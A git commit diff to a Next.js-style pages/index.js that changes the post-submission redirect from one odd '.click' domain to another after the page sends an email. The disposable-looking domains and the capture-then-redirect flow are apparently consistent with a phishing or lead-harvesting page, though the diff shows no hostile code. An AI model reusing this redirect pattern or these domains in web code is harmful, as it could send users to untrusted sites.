07edf7113c1709c40ae3db747b59a4078b477091
husknet <127146284+husknet@users.noreply.github.com>
2024-11-20 11:50:25 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://ct.logbook-annul-srt.click';
+        window.location.href = 'https://ct.ahop-loine.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
